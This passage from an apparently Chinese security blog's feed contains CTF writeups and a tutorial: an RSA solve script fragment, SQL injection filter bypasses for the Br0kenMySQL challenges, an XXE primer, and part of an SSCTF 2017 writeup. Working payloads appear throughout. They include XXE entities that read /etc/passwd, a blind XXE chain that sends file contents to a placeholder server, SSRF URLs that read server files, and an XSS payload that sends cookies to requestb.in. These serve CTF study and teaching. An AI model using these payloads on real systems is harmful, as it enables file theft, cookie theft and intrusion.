class="line">        flag = long_to_bytes(gmpy2.iroot(res,i)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> string.printable:</span><br><span class="line">                num = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'e is '</span> + str(i)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>Although flag isn’t standard format, we can print all the printable message.</p><p><img src="http://heartsky.info/images/image/hackcon2017/1.jpg" alt=""></p><p>Nice!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;I was finally able to capture the modulos and ciphertext that my friend uses to send the flag to everyone. Please hack it, a
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://heartsky.info/tags/CTF/"/>
    
      <category term="writeup" scheme="http://heartsky.info/tags/writeup/"/>
    
      <category term="RSA" scheme="http://heartsky.info/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>一个有趣的 SQL 注入小系列</title>
    <link href="http://heartsky.info/2017/07/16/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%B3%BB%E5%88%97/"/>
    <id>http://heartsky.info/2017/07/16/一个有趣的-SQL-注入小系列/</id>
    <published>2017-07-16T14:38:46.000Z</published>
    <updated>2017-11-15T06:18:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>昨天和小伙伴们打了一场越南的 SeePwn CTF，题目质量比想象中的高(虽然也是被虐了。感觉这个 SQL 注入的三道题目蛮有趣的，便记录下并给出自己的思考。</p><h3 id="Br0kenMySQL1"><a href="#Br0kenMySQL1" class="headerlink" title="Br0kenMySQL1"></a>Br0kenMySQL1</h3><p>直接给了源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'debug'</span>]==<span class="string">'🕵'</span>) <span class="keyword">die</span>(highlight_file(<span class="keyword">__FILE__</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line">$link = mysqli_connect(<span class="string">'localhost'</span>, MYSQL_USER, MYSQL_PASSWORD);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$link) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mysqli_select_db($link,MYSQL_USER)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Could not select database: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'#sleep|benchmark|floor|rand|count#is'</span>,$id))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Don\'t hurt me :-('</span>);</span><br><span class="line">$query = mysqli_query($link,<span class="string">"SELECT username FROM users WHERE id = "</span>. $id);</span><br><span class="line">$row = mysqli_fetch_array($query);</span><br><span class="line">$username = $row[<span class="string">'username'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($username === <span class="string">'guest'</span>)&#123;</span><br><span class="line"></span><br><span class="line">    $ip = @$_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]!=<span class="string">""</span> ? $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] : $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'#sleep|benchmark|floor|rand|count#is'</span>,$ip))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Don\'t hurt me :-('</span>);</span><br><span class="line">    var_dump($ip);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($ip))</span><br><span class="line">        mysqli_query($link,<span class="string">"INSERT INTO logs VALUES('&#123;$ip&#125;')"</span>);</span><br><span class="line"></span><br><span class="line">    $query = mysqli_query($link,<span class="string">"SELECT username FROM users WHERE id = "</span>. $id);</span><br><span class="line">    $row = mysqli_fetch_array($query);</span><br><span class="line">    $username = $row[<span class="string">'username'</span>];</span><br><span class="line">    <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"What ???????\nLogin as guest&amp;admin at the same time ?\nSeems our code is broken, here is your bounty\n"</span>;</span><br><span class="line">        <span class="keyword">die</span>(FLAG);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Nothing here"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hello "</span>.$username;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>第一次查询 username 得到的是 guest，第二次查询变成了 admin (id=1 是 admin，id=2 是 guest)。那么这中间多了什么操作呢，一个插入语句以及时间的变化，所以根据这两点就有两个方向的思路。</p><p>第一个思路就够解决这个问题了，根据能否查询到 ip 的记录作为判断条件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=if((select ip from logs where ip=&apos;127.0.0.123&apos; limit 1),1,2)%23</span><br><span class="line">X-Forwarded-For: 127.0.0.123</span><br></pre></td></tr></table></figure></p><h3 id="Br0kenMySQL2"><a href="#Br0kenMySQL2" class="headerlink" title="Br0kenMySQL2"></a>Br0kenMySQL2</h3><p>和上题一样，只不过多了点过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'#sleep|benchmark|floor|rand|count|select|from|\(|\)#is'</span>,$id))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Don\'t hurt me :-('</span>);</span><br></pre></td></tr></table></figure></p><p>select 和 from 被禁用，第一个思路行不通了。同时，过滤了圆括号，意味着大部分函数不能用了，但不是所有的函数，为什么这么说呢，因为有些特殊的函数是没有圆括号的。同时结合两个 select 语句时间不一样，我们可以采用有关时间的函数，从<a href="https://dev.mysql.com/doc/refman/5.7/en/date-and-time-functions.html" target="_blank" rel="external">官方文档</a>上可以找到这些<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CURRENT_TIME</span><br><span class="line">CURRENT_DATE</span><br><span class="line">CURRENT_TIMESTAMP</span><br><span class="line">LOCALTIMESTAMP</span><br></pre></td></tr></table></figure></p><p>以 CURRENT_TIME 为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT CURRENT_TIME;</span><br><span class="line">+--------------+</span><br><span class="line">| CURRENT_TIME |</span><br><span class="line">+--------------+</span><br><span class="line">| 20:39:27     |</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT CURRENT_TIME+0;</span><br><span class="line">+----------------+</span><br><span class="line">| CURRENT_TIME+0 |</span><br><span class="line">+----------------+</span><br><span class="line">|         203934 |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure></p><p>所以可以先获得本地当前时间，然后选取一个靠后点的时间，满足第一个 select 语句在这个时间点前，而第二个 select 语句在这个时间点后便可(注意时差问题)，我这里用的是或语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2||current_time&gt;51630%23</span><br></pre></td></tr></table></figure></p><p>默认是 guest，当满足时间条件时，查询得到的第一条记录是 id=1。然后开着 burp 跑就行了</p><h3 id="Br0kenMySQL3"><a href="#Br0kenMySQL3" class="headerlink" title="Br0kenMySQL3"></a>Br0kenMySQL3</h3><p>更加严格的黑名单<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'#sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day#is'</span>,$id))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Don\'t hurt me :-('</span>);</span><br></pre></td></tr></table></figure></p><p>过滤了日期和时间函数有关的关键字。那么刚开始想的两条路就走不通了，重新思考下，这两点都是系统产生的的变化，换句话说是我们不用做什么就可以产生的变化。如果我们手动产生变化呢？刚开始想到了系统变量，但是它的值不能改变，想到用户自定义变量，如果在第一条语句中定义了一个自定义变量，根据它是否为 NULL 作为判断条件。尴尬的是没想到除了 if 还可以用 case 语句，而且没有圆括号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=case when @hs is null then @hs:=2 else 1 end%23</span><br></pre></td></tr></table></figure></p><p>好吧，通杀三道题 = =</p><p>但是后来我发现其实不用 case 语句也是可以的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2||@hs is not null||@hs:=0%23</span><br></pre></td></tr></table></figure></p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>问题的关键在于两者间有什么不一样的，中间发生了什么变化，其中系统产生了哪些变化，我们手动又可以产生哪些变化，然后到特定的 MySQL 中又怎么来实现</p><p>虽然题目不难，但思路值得学习</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;昨天和小伙伴们打了一场越南的 SeePwn CTF，题目质量比想象中的高(虽然也是被虐了。感觉这个 SQL 注入的三道题目蛮有趣的，便记录下并给出自己的思考。&lt;/p&gt;
&lt;h3 id=&quot;Br0kenMySQL1&quot;&gt;&lt;a href=&quot;#Br0kenMySQL1&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://heartsky.info/tags/CTF/"/>
    
      <category term="writeup" scheme="http://heartsky.info/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>从 0 开始学习 XXE</title>
    <link href="http://heartsky.info/2017/06/02/%E4%BB%8E-0-%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0-XXE/"/>
    <id>http://heartsky.info/2017/06/02/从-0-开始学习-XXE/</id>
    <published>2017-06-01T16:06:58.000Z</published>
    <updated>2017-11-15T06:18:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近遇到了很多 XXE 的题目，之前没有仔细研究过，便在翻阅了很多资料的基础上尝试着总结了下</p><h2 id="what-is-XXE"><a href="#what-is-XXE" class="headerlink" title="what is XXE"></a>what is XXE</h2><p>XXE(XML External Entity)，即 XML外部实体注入攻击，当允许引用外部实体时，可通过构造恶意内容，造成文件读取、攻击内网等危害。</p><p>那么什么是 XML?</p><h2 id="what-is-XML"><a href="#what-is-XML" class="headerlink" title="what is XML"></a>what is XML</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</span><br></pre></td></tr></table></figure><p>举个例子</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- xml声明 --&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- DTD文档类型定义(可选) --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY test "aaa"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 文档元素 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 DTD(Document Type Defination)，即文档类型定义，用来定义 XML 文档的合法构建模块。可以在 XML 文档中声明，也可以外部引用。</p><p>声明或引入 DTD 的几种方式：</p><h3 id="内部声明-DTD"><a href="#内部声明-DTD" class="headerlink" title="内部声明 DTD"></a>内部声明 DTD</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><h3 id="外部引用-DTD"><a href="#外部引用-DTD" class="headerlink" title="外部引用 DTD"></a>外部引用 DTD</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>你可能看到了 XML 文档中的 ENTITY，这就是在 DTD 中定义的实体，实体就是对数据的引用，根据实体种类的不同，XML 解析器将使用实体的替代文本或者外部文档的内容来替代实体引用。</p><p>而 XML 中的实体分为以下四种</p><ul><li>字符实体</li><li>命名实体</li><li>外部实体</li><li>参数实体</li></ul><h4 id="字符实体"><a href="#字符实体" class="headerlink" title="字符实体"></a>字符实体</h4><p>指用十进制格式(<code>&amp;#aaa;</code>)或十六进制格式(<code>&amp;#xaaa;</code>)来指定任意 Unicode 字符。对 XML 解析器而言，字符实体与直接输入指定字符的效果完全相同。</p><h4 id="命名实体"><a href="#命名实体" class="headerlink" title="命名实体"></a>命名实体</h4><p>也称为内部实体，在 DTD 或内部子集（即文档中 <code>&lt;!DOCTYPE&gt;</code> 语句的一部分）中声明，在文档中用作引用。在 XML 文档解析过程中，实体引用将由它的表示替代。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY test &quot;233&quot;&gt;</span><br></pre></td></tr></table></figure></p><h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><p>外部实体表示外部文件的内容，用 SYSTEM 关键词表示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY test SYSTEM &quot;1.xml&quot;&gt;</span><br></pre></td></tr></table></figure></p><h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p>参数实体只用于 DTD 和文档的内部子集中。它们使用百分号(%)而不是与字符(&amp;)，可以是命名实体或外部实体。另外，参数实体可以引用其他参数实体。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % aaa &quot;233&quot;&gt;</span><br><span class="line">&lt;!ENTITY % test &quot;%aaa&quot;&gt;</span><br></pre></td></tr></table></figure></p><h2 id="显式-XXE"><a href="#显式-XXE" class="headerlink" title="显式 XXE"></a>显式 XXE</h2><h3 id="第一种-外部实体"><a href="#第一种-外部实体" class="headerlink" title="第一种:外部实体"></a>第一种:外部实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="第二种-把外部实体放到外部文件中，一般是攻击者服务器"><a href="#第二种-把外部实体放到外部文件中，一般是攻击者服务器" class="headerlink" title="第二种:把外部实体放到外部文件中，一般是攻击者服务器"></a>第二种:把外部实体放到外部文件中，一般是攻击者服务器</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a SYSTEM "http://xxx/xxx.xml"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xxx.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="第三种-参数实体"><a href="#第三种-参数实体" class="headerlink" title="第三种:参数实体"></a>第三种:参数实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY %d SYSTEM "http://xxx/xxx.xml"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xxx.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="支持协议"><a href="#支持协议" class="headerlink" title="支持协议"></a>支持协议</h3><p>除了我们上面的用的 file 协议，还可以使用 http、php、ftp等协议。具体能够使用的协议也和语言有关，见下图</p><h2 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h2><p>如果目标服务器没有回显，就只能用 Blind XXE 了。原理就是带着获取的文件源码以 get 参数或其他形式去访问我们的服务器，然后在日志里就可以找到我们要获取的内容了。</p><p>Blink XXE主要使用了DTD约束中的参数实体和内部实体。<br>参数实体是一种只能在DTD中定义和使用的实体，一般引用时使用%作为前缀。而内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % hs SYSTEM "file:///C:/1.txt"&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % remote SYSTEM "http://xxx/xxx.xml"&gt;</span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">    %all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xxx.xml<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://xxx/x.php?hs=%hs;'&gt;"&gt;</span><br></pre></td></tr></table></figure></p><p>这里解释下，%remote; 会把外部文件引入到这个 XML 中，%all; 替换为后面的嵌套实体，这时再在 root 节点中引入 send 实体，便可实现数据转发。如果在 xxx.xml 中 send 实体是参数实体的话，也可以采用下面的形式。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY[  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "file:///C:/1.txt"&gt;  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://xxx/xxx.xml"&gt;  </span></span><br><span class="line"><span class="meta">%remote;  </span></span><br><span class="line"><span class="meta">%all;  </span></span><br><span class="line"><span class="meta">%send;  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></p><p>xxx.xml<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all "&lt;!ENTITY % send SYSTEM 'http://xxx/x.php?hs=%hs;'&gt;"&gt;</span><br></pre></td></tr></table></figure></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.ibm.com/developerworks/cn/xml/x-entities/" target="_blank" rel="external">https://www.ibm.com/developerworks/cn/xml/x-entities/</a><br><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="external">http://blog.csdn.net/u011721501/article/details/43775691</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/69</a><br><a href="http://c014.cn/2017/04/03/%E4%BB%8E%E9%9B%B6%E5%AD%A6%E4%B9%A0XXE/" target="_blank" rel="external">http://c014.cn/2017/04/03/%E4%BB%8E%E9%9B%B6%E5%AD%A6%E4%B9%A0XXE/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近遇到了很多 XXE 的题目，之前没有仔细研究过，便在翻阅了很多资料的基础上尝试着总结了下&lt;/p&gt;
&lt;h2 id=&quot;what-is-XXE&quot;&gt;&lt;a href=&quot;#what-is-XXE&quot; class=&quot;headerlink&quot; title=&quot;what is XXE&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="XXE" scheme="http://heartsky.info/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>SSCTF 2017 writeup</title>
    <link href="http://heartsky.info/2017/05/09/SSCTF-2017-writeup/"/>
    <id>http://heartsky.info/2017/05/09/SSCTF-2017-writeup/</id>
    <published>2017-05-09T15:42:23.000Z</published>
    <updated>2017-11-15T06:18:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="捡吗？-100"><a href="#捡吗？-100" class="headerlink" title="捡吗？ - 100"></a>捡吗？ - 100</h3><p>ssrf 的漏洞，打开后可以看到 <code>news.php?url=xxx</code>，因为题目说是有一台 10.23.173.* 的服务器，所以扫下这个网段，是 10.23.173.190。刚开始的时候扫了下内网服务器的目录，得到了 l.php readme 什么的文件，做了半天后来才知道这是 web3 的服务器 ==<br>最后主办方放了个很大的提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过程 120.132.21.19 -&gt; 10.23.173.190 -&gt; ftp://172.17.0.2</span><br></pre></td></tr></table></figure></p><p>ftp 有过滤，大小写可以绕过<br>访问这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.132.21.19/news.php?url=10.23.173.190/news.php?url=Ftp://172.17.0.2/</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r-- 1 root root 40 May 05 12:27 flag.txt</span><br></pre></td></tr></table></figure></p><p>然后再访问 flag.txt 就拿到 flag 了</p><h3 id="弹幕-200"><a href="#弹幕-200" class="headerlink" title="弹幕 - 200"></a>弹幕 - 200</h3><p>是一个有类似b站发送弹幕功能的网站，可以看到一个滑稽的表情在一直发，看下内容是<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/static/images/welcome.gif"</span> <span class="attr">onload</span>=<span class="string">"c=encodeURIComponent(document.cookie);if(c.length&gt;32)&#123;a=new Image();a.src='/xssHentai/request/1/?body='+c;&#125;"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>这条信息应该是脚本定时发的。访问 xssHentai，是一个自带的 xss 平台。任意的用户名和密码都可以登录，看到有个 flag 的 cookie，内容是 <code>&quot;if uid = 1\054you will see flag&quot;</code>，页面里有 <code>请按照/xssHentai/request/23/?body=xxxxx格式发送请求,每次刷新显示1条并删除</code>，也就是说我们登录的这个 xss 平台 flag 是 23，而 bot 登录的平台 uid 是 1，它的 cookie 里是有 flag 的。访问下 <code>body=&lt;img src=1&gt;</code>，发现是没有过滤的，图片直接解析了，那么就有一种思路了。我们在弹幕里发送 body=payload，这样 payload 就会被 bot 访问，指向我们自己的 xss 平台就可以了<br>最终的 payload<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/static/images/welcome.gif"</span> <span class="attr">onload</span>=<span class="string">"a=new Image();a.src='/xssHentai/request/1/?body=%3Cimg%20src%3D0%20onerror%3D%27b%3Dnew%20Image%28%29%3Bb.src%3D%22http%3A%2f%2frequestb.in%2fqdbhulqd%3Finspect%3D%22%2bdocument.cookie%27%3E';"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="白吗-全是套路-300"><a href="#白吗-全是套路-300" class="headerlink" title="白吗?全是套路-300"></a>白吗?全是套路-300</h3><p>打开后有个 news.php，get 请求里有个 id 参数，以为是注入，但是尝试了下，发现很迷<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos;</span><br><span class="line">返回 select * from sscrf where id=1&apos;</span><br><span class="line">id=1 and 1=2</span><br><span class="line">返回空</span><br><span class="line">id=1 and 1=3</span><br><span class="line">返回新闻不存在</span><br></pre></td></tr></table></figure></p><p>神奇的代码，然后想到 web1 连接到的内网服务器是 web3 的，既然能用 ftp 协议读取文件，应该也能用 file 协议读取这台服务器的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.132.21.19/news.php?url=10.23.173.190/news.php?url=FILe:///var/www/news.php</span><br></pre></td></tr></table></figure></p><p>成功读到源码<br>submit.php<br><figure class="highlight php"><table><tr><td 